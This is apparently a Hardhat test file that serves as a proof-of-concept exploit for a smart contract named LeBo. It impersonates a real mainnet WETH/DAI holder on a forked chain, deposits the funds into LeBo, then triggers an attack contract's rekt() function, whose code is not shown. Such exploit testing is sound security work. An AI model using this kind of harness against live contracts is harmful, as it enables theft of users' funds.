const { ethers, network } = require("hardhat");

describe("Rekt LeBo", function () {
  it("Should exploit LeBo", async function () {
    const accounts = await ethers.getSigners();
    const LeBo = await ethers.getContractFactory("LeBo");
    const LeBoRekt = await ethers.getContractFactory("LeBoRekt");

    const lebo = await LeBo.deploy();
    await lebo.deployed();

    const leboRekt = await LeBoRekt.deploy(lebo.address);
    await leboRekt.deployed();

    const weth = await ethers.getContractAt("IERC20", "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2");
    const dai = await ethers.getContractAt("IERC20", "0x6B175474E89094C44Da98b954EedeAC495271d0F");

    // UNI v3 WETH-DAI
    user = "0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8";
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [user]
    });
    const userSigner = await ethers.provider.getSigner(user);
    await hre.network.provider.request({
      method: "hardhat_setBalance",
      params: [user, "0x1000000000000000000"]
    });
    const wethBalance = await weth.balanceOf(user);
    const daiBalance = await dai.balanceOf(user);
    await weth.connect(userSigner).approve(lebo.address, wethBalance);
    await dai.connect(userSigner).approve(lebo.address, daiBalance);
    await lebo.connect(userSigner).depositWETH(wethBalance);
    await lebo.connect(userSigner).depositDAI(daiBalance);
    
    await leboRekt.connect(accounts[0]).rekt();
  });
});
